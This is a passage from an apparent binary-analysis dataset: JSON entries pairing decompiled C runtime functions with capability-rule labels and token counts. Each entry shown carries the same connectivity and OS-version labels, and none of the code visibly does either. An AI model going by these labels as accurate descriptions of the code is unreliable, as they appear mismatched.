code_r0x004bcf0e;\n                var_10h = var_10h & 0xffffff00;\n                uVar6 = arg_10h[1];\n                puVar3 = arg_10h + 1;\n                if (uVar6 == 0x23) {\n                    var_10h = CONCAT31(SUB43(uVar2, 1), 1);\n                    uVar6 = arg_10h[2];\n                    puVar3 = arg_10h + 2;\n                }\n                arg_10h = puVar3;\n                if ((uVar6 == 0x45) || (uVar6 == 0x4f)) {\n                    arg_10h = arg_10h + 1;\n                    uVar6 = *arg_10h;\n                }\n                cVar4 = fcn.004bae6c(&var_1ch, uVar6, arg_14h, &var_ch, &var_8h, arg_18h, var_10h);\n                if (cVar4 == '\\0') {\n                    if (var_8h == 0) goto code_r0x004bcef2;\n                    bVar1 = true;\n                    goto code_r0x004bcef4;\n                }\n            }\n            else {\n                *var_ch = uVar6;\n                var_ch = var_ch + 1;\n                var_8h = var_8h + -1;\n            }\n            arg_10h = arg_10h + 1;\n        } while (var_8h != 0);\n        if (var_8h != 0) {\n            *var_ch = 0;\n            iVar7 = arg_ch - var_8h;\n            goto code_r0x004bcf1e;\n        }\n    }\ncode_r0x004bcef2:\n    bVar1 = false;\ncode_r0x004bcef4:\n    *arg_8h = 0;\n    if ((bVar1) || (var_8h != 0)) {\ncode_r0x004bcf0e:\n        puVar5 = fcn.004039a4();\n        *puVar5 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        puVar5 = fcn.004039a4();\n        *puVar5 = 0x22;\n    }\ncode_r0x004bcf1e:\n    if (var_14h != '\\0') {\n        *(var_20h + 0x350) = *(var_20h + 0x350) & 0xfffffffd;\n    }\n    return iVar7;\n}\n",
        "token_count": 1005
    },
    "004045d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004045d9(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "004045fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004045fc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *pcVar2;\n    code *pcVar3;\n    uchar uVar4;\n    char cVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    int32_t iVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0x44);\n    pcVar2 = *(unaff_EBP + 0x14);\n    iVar11 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    cVar5 = *pcVar2;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n    pcVar9 = pcVar2;\n    cVar1 = cVar5;\n    while (cVar1 != '\\0') {\n        if (cVar1 == cVar5) {\n            iVar11 = iVar11 + 1;\n        }\n        pcVar9 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n    }\n    *(unaff_EBP + -0x3c) = iVar11;\n    fcn.004036e8(iVar11, 0);\n    *(unaff_EBP + -4) = 1;\n    uVar6 = fcn.00404ed5(1);\n    *(unaff_EBP + -0x4c) = uVar6;\n    *(unaff_EBP + -4) = 2;\n    uVar6 = fcn.004035a8(unaff_EBP + -0x50);\n    *(unaff_EBP + -0x38) = uVar6;\n    *(unaff_EBP + -4) = 0;\n    fcn.004050a6();\n    *(unaff_EBP + -0x40) = 0xfffffffe;\n    uVar10 = 1;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar12 = 0;\n        iVar11 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        if (*(unaff_EBP + -0x3c) == 0) break;\n        do {\n            cVar5 = pcVar2[iVar11];\n            if (cVar5 != '\\0') {\n                do {\n                    if (cVar5 == *pcVar2) break;\n                    iVar11 = iVar11 + 1;\n                    cVar5 = pcVar2[iVar11];\n                } while (cVar5 != '\\0');\n            }\n            bVar13 = 0xf < *(unaff_EBP + -0x14);\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar12) == '\\0') {\n                iVar11 = iVar11 + uVar10;\n                if ((pcVar2[iVar11] == *pcVar2) || (pcVar2[iVar11] == '\\0')) {\n                    if (0x7e < uVar10) {\n                        uVar10 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (bVar13) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar12) = uVar10;\n                    uVar10 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -0x40) = uVar12;\n                    goto code_r0x00467992;\n                }\n                cVar5 = fcn.0040640b(*(unaff_EBP + -0x48));\n                if (cVar5 != '\\0') {\ncode_r0x00467957:\n                    uVar10 = *(unaff_EBP + -0x30);\n                    uVar8 = uVar10;\n                    if (0x7e < uVar10) {\n                        uVar8 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar12) = uVar8;\n                    goto code_r0x00467992;\n                }\n                if (*(unaff_EBP + 0x18) == '\\x01') {\n                    iVar7 = *(unaff_EBP + -0x34);\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.004050a1();\n                        iVar7 = *(unaff_EBP + -0x34);\n                    }\n                    bVar13 = pcVar2[iVar11] == *(iVar7 + 6);\n                }\n                else {\n                    *(unaff_EBP + -0x4c) = pcVar2[iVar11];\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x10);\n                    (**0x573000)(*(unaff_EBP + -0x4c));\n                    uVar4 = (*pcVar3)();\n                    iVar7 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -0x2a) = uVar4;\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.004050a1();\n                    }\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x10);\n                    (**0x573000)(*(iVar7 + 6));\n                    cVar5 = (*pcVar3)();\n                    uVar12 = *(unaff_EBP + -0x44);\n                    bVar13 = *(unaff_EBP + -0x2a) == cVar5;\n                }\n                if (!bVar13) goto code_r0x00467957;\n                uVar10 = *(unaff_EBP + -0x30);\n                cVar5 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (bVar13) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar11 = iVar11 + *(iVar7 + uVar12);\ncode_r0x00467992:\n                cVar5 = *(unaff_EBP + -0x29);\n            }\n            uVar12 = uVar12 + 1;\n            *(unaff_EBP + -0x44) = uVar12;\n        } while (uVar12 < *(unaff_EBP + -0x3c));\n        if ((cVar5 == '\\0') || (cVar5 = fcn.0040640b(*(unaff_EBP + -0x48)),  cVar5 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.004027a2();\n        *(unaff_EBP + -0x40) = 0xffffffff;\n        uVar10 = *(unaff_EBP + -0x30);\n    }\n    fcn.004029b9();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 1835
    },
    "00404606": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00404606(uint *arg_8h)\n\n{\n    bool bVar1;\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.004053d5(&var_10h);\n    fcn.004032bf(&var_8h, 0x7b);\n    bVar1 = false;\n    while( true ) {\n        if (bVar1) {\n            fcn.00403cba(0x2c);\n        }\n        arg_8h_00 = fcn.00403deb(&var_10h);\n        fcn.00402eb9(arg_8h_00);\n        if (**0x56f458 != '@') break;\n        if ((*0x56f458)[1] == '@') {\n            *0x56f458 = *0x56f458 + 2;\n            fcn.00403cba(0x7d);\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        bVar1 = true;\n        *0x56f458 = *0x56f458 + 1;\n    }\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    return arg_8h;\n}\n",
        "token_count": 357
    },
    "00404688": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.00404688(uint arg_8h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char **ppcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char **ppcVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.004057e5(arg_8h);\n    pcVar7 = NULL;\n    iVar10 = 0xc;\n    ppcVar3 = *(var_14h + 0x9c) + 0x68;\n    ppcVar8 = ppcVar3;\n    do {\n        pcVar5 = ppcVar8[-0xc];\n        pcVar4 = pcVar5 + 1;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        pcVar6 = *ppcVar8;\n        pcVar9 = pcVar6 + 1;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        ppcVar8 = ppcVar8 + 1;\n        pcVar7 = pcVar5 + pcVar6 + pcVar7 + (-pcVar9 - pcVar4) + 2;\n        iVar10 = iVar10 + -1;\n    } while (iVar10 != 0);\n    pcVar4 = fcn.00403ff3(pcVar7 + 1);\n    if (pcVar4 != NULL) {\n        var_8h = 0;\n        pcVar5 = pcVar4;\n        do {\n            *pcVar5 = ':';\n            pcVar9 = pcVar5 + 1;\n            iVar10 = fcn.00405f56(pcVar9, pcVar4 + pcVar7 + (1 - pcVar9), ppcVar3[-0xc]);\n            if (iVar10 != 0) {\ncode_r0x004baa6b:\n                fcn.004035f8(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                pcVar7 = (*pcVar2)();\n                return pcVar7;\n            }\n            pcVar6 = pcVar9;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            pcVar9 = pcVar9 + (pcVar6 - (pcVar5 + 2));\n            *pcVar9 = ':';\n            pcVar5 = pcVar9 + 1;\n            iVar10 = fcn.00405f56(pcVar5, pcVar4 + pcVar7 + (1 - pcVar5), *ppcVar3);\n            if (iVar10 != 0) goto code_r0x004baa6b;\n            pcVar6 = pcVar5;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            pcVar5 = pcVar5 + (pcVar6 - (pcVar9 + 2));\n            ppcVar3 = ppcVar3 + 1;\n            var_8h = var_8h + 1;\n        } while (var_8h < 0xc);\n        *pcVar5 = '\\0';\n    }\n    fcn.00406302(0);\n    if (var_ch != '\\0') {\n        *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n    }\n    return pcVar4;\n}\n",
        "token_count": 889
    },
    "004046a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004046a6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t unaff_EBP;\n    int32_t iVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0x44);\n    piVar2 = *(unaff_EBP + 0x14);\n    iVar7 = 0;\n    iVar10 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    iVar5 = *piVar2;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n    iVar1 = iVar5;\n    while (iVar1 != 0) {\n        if (iVar1 == iVar5) {\n            iVar10 = iVar10 + 1;\n        }\n        iVar7 = iVar7 + 1;\n        iVar1 = piVar2[iVar7];\n    }\n    *(unaff_EBP + -0x3c) = iVar10;\n    fcn.004036e8(iVar10, 0);\n    *(unaff_EBP + -4) = 1;\n    uVar6 = fcn.00404ed5(1);\n    *(unaff_EBP + -0x4c) = uVar6;\n    *(unaff_EBP + -4) = 2;\n    uVar6 = fcn.0040342c(unaff_EBP + -0x50);\n    *(unaff_EBP + -0x38) = uVar6;\n    *(unaff_EBP + -4) = 0;\n    fcn.004050a6();\n    *(unaff_EBP + -0x40) = 0xfffffffe;\n    uVar9 = 1;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar11 = 0;\n        iVar10 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        if (*(unaff_EBP + -0x3c) == 0) break;\n        do {\n            iVar5 = piVar2[iVar10];\n            if (iVar5 != 0) {\n                do {\n                    if (iVar5 == *piVar2) break;\n                    iVar10 = iVar10 + 1;\n                    iVar5 = piVar2[iVar10];\n                } while (iVar5 != 0);\n            }\n            bVar12 = 0xf < *(unaff_EBP + -0x14);\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar11) == '\\0') {\n                iVar10 = iVar10 + uVar9;\n                if ((piVar2[iVar10] == *piVar2) || (piVar2[iVar10] == 0)) {\n                    if (0x7e < uVar9) {\n                        uVar9 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (bVar12) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar11) = uVar9;\n                    uVar9 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -0x40) = uVar11;\n                    goto code_r0x00468166;\n                }\n                cVar4 = fcn.00401a9b(*(unaff_EBP + -0x48));\n                if (cVar4 != '\\0') {\ncode_r0x0046812b:\n                    uVar9 = *(unaff_EBP + -0x30);\n                    uVar8 = uVar9;\n                    if (0x7e < uVar9) {\n                        uVar8 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar11) = uVar8;\n                    goto code_r0x00468166;\n                }\n                if (*(unaff_EBP + 0x18) == '\\x01') {\n                    if (*(*(unaff_EBP + -0x34) + 4) == '\\0') {\n                        fcn.00405c40();\n                    }\n                    bVar12 = piVar2[iVar10] == *(*(unaff_EBP + -0x34) + 6);\n                }\n                else {\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x20);\n                    (**0x573000)(piVar2[iVar10]);\n                    uVar9 = (*pcVar3)();\n                    iVar7 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -0x4c) = uVar9 & 0xffff;\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.00405c40();\n                    }\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x20);\n                    (**0x573000)(*(iVar7 + 6));\n                    iVar5 = (*pcVar3)();\n                    uVar11 = *(unaff_EBP + -0x44);\n                    bVar12 = *(unaff_EBP + -0x4c) == iVar5;\n                }\n                if (!bVar12) goto code_r0x0046812b;\n                uVar9 = *(unaff_EBP + -0x30);\n                cVar4 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (bVar12) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar10 = iVar10 + *(iVar7 + uVar11);\ncode_r0x00468166:\n                cVar4 = *(unaff_EBP + -0x29);\n            }\n            uVar11 = uVar11 + 1;\n            *(unaff_EBP + -0x44) = uVar11;\n        } while (uVar11 < *(unaff_EBP + -0x3c));\n        if ((cVar4 == '\\0') || (cVar4 = fcn.00401a9b(*(unaff_EBP + -0x48)),  cVar4 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.004047a5();\n        *(unaff_EBP + -0x40) = 0xffffffff;\n        uVar9 = *(unaff_EBP + -0x30);\n    }\n    fcn.004029b9();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 1786
    },
    "004046bf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.004046bf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint32_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    uint extraout_ECX;\n    char *pcVar7;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(0x10);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    fcn.0040327e(*(*(unaff_EBP + 0x1c) + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.0040342c(unaff_EBP + -0x1c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x10) = piVar5;\n    fcn.004050a6();\n    pcVar7 = *(unaff_EBP + 0x28);\n    puVar1 = *(unaff_EBP + 0x20);\n    do {\n        cVar4 = *pcVar7;\n        if (cVar4 == '\\0') {\ncode_r0x004701cd:\n            cVar4 = fcn.00401a9b(unaff_EBP + 0x14);\n            if (cVar4 != '\\0') {\n                *puVar1 = *puVar1 | 1;\n            }\n            puVar6 = *(unaff_EBP + 8);\n            uVar3 = *(unaff_EBP + 0x10);\n            *puVar6 = *(unaff_EBP + 0xc);\n            puVar6[1] = uVar3;\n            fcn.0040113b();\n            return;\n        }\n        if (cVar4 == '%') {\n            pcVar7 = pcVar7 + 1;\n            pcVar2 = *(**(unaff_EBP + -0x14) + 0x24);\n            (**0x573000)(unaff_EBP + -0x1c, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                         *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), puVar1, *(unaff_EBP + 0x24), *pcVar7, 0);\n            puVar6 = (*pcVar2)();\n            uVar3 = puVar6[1];\n            *(unaff_EBP + 0xc) = *puVar6;\n            *(unaff_EBP + 0x10) = uVar3;\n        }\n        else if (cVar4 == ' ') {\n            cVar4 = fcn.00401a9b(unaff_EBP + 0x14);\n            while (cVar4 == '\\0') {\n                if (*(unaff_EBP + 0x10) == '\\0') {\n                    fcn.00405c40();\n                }\n                pcVar2 = *(*piVar5 + 0x10);\n                (**0x573000)(0x48, *(unaff_EBP + 0x12));\n                cVar4 = (*pcVar2)();\n                if (cVar4 == '\\0') break;\n                fcn.004047a5();\n                cVar4 = fcn.00401a9b(unaff_EBP + 0x14);\n                piVar5 = *(unaff_EBP + -0x10);\n            }\n        }\n        else {\n            if (*(unaff_EBP + 0x10) == '\\0') {\n                fcn.00405c40();\n            }\n            pcVar2 = *(*piVar5 + 0x38);\n            (**0x573000)(*(unaff_EBP + 0x12), 0);\n            cVar4 = (*pcVar2)();\n            if (cVar4 != *pcVar7) {\n                *puVar1 = *puVar1 | 2;\n                goto code_r0x004701cd;\n            }\n            fcn.004047a5();\n        }\n        piVar5 = *(unaff_EBP + -0x10);\n        pcVar7 = pcVar7 + 1;\n    } while( true );\n}\n",
        "token_count": 1095
    },
    "0040470a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040470a(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack24;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x004cb42e:\n            if (arg_ch != 0) {\n                piVar3 = arg_8h;\n                iVar5 = arg_ch;\n                if ((arg_14h == 0) || (arg_10h != NULL)) {\n                    do {\n                        if (*piVar3 == 0) break;\n                        piVar3 = piVar3 + 1;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                    if (iVar5 != 0) {\n                        if (arg_14h == -1) {\n                            iVar4 = arg_10h - piVar3;\n                            do {\n                                iVar1 = *(iVar4 + piVar3);\n                                *piVar3 = iVar1;\n                                piVar3 = piVar3 + 1;\n                                if (iVar1 == 0) break;\n                                iVar5 = iVar5 + -1;\n                            } while (iVar5 != 0);\n                        }\n                        else {\n                            iVar4 = arg_14h;\n                            if (arg_14h != 0) {\n                                do {\n                                    iVar1 = *arg_10h;\n                                    arg_10h = arg_10h + 1;\n                                    *piVar3 = iVar1;\n                                    piVar3 = piVar3 + 1;\n                                    if ((iVar1 == 0) || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                                    iVar4 = iVar4 + -1;\n                                } while (iVar4 != 0);\n                            }\n                            if (iVar4 == 0) {\n                                *piVar3 = 0;\n                            }\n                        }\n                        if (iVar5 != 0) {\n                            return 0;\n                        }\n                        if (arg_14h == -1) {\n                            arg_8h[arg_ch + -1] = 0;\n                            return 0x50;\n                        }\n                        *arg_8h = 0;\n                        puVar2 = fcn.004039a4();\n                        uStack24 = 0x22;\n                        goto code_r0x004cb44c;\n                    }\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x004cb42e;\n    puVar2 = fcn.004039a4();\n    uStack24 = 0x16;\ncode_r0x004cb44c:\n    *puVar2 = uStack24;\n    fcn.00403751();\n    return uStack24;\n}\n",
        "token_count": 689
    },
    "0040471e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_16h\n\nvoid __cdecl fcn.0040471e(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_78h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0040536c(0x88);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.004053a8(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x573000)(unaff_EBP + -0x78);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x68) == 0) {\n        *(unaff_EBP + -0x90) = 0;\n    }\n    else {\n        uVar12 = fcn.004017d0();\n        *(unaff_EBP + -0x90) = uVar12 & 0xffff;\n    }\n    piVar5 = fcn.0040342c(*(unaff_EBP + -0x80));\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x573000)(\"0123456789ABCDEFabcdef-+Xx\", 0x54e48f, unaff_EBP + -0x48);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x94);\n    *(unaff_EBP + -0x84) = puVar10;\n    cVar3 = fcn.00401a9b(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 == *(unaff_EBP + -0x1a)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405c40();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x1c)) goto code_r0x0047080f;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x84) = puVar10 + 1;\n        fcn.004047a5();\n    }\ncode_r0x0047080f:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -0x80) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x7a) = 0;\n    cVar3 = fcn.00401a9b(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        if (*(iVar8 + 6) != *(unaff_EBP + -0x48)) goto code_r0x004708e5;\n        *(unaff_EBP + -0x79) = 1;\n        *(unaff_EBP + -0x8c) = 1;\n        fcn.004047a5();\n        cVar3 = fcn.00401a9b(*(unaff_EBP + -0x88));\n        if (cVar3 != '\\0') {\ncode_r0x004708dc:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x004708f8;\n            }\n            goto code_r0x004708f4;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 != *(unaff_EBP + -0x16)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405c40();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x18)) goto code_r0x004708dc;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x004708f4;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x79) = 0;\n        *(unaff_EBP + -0x8c) = 0;\n        fcn.004047a5();\ncode_r0x004708f8:\n        *(unaff_EBP + -0x80) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else 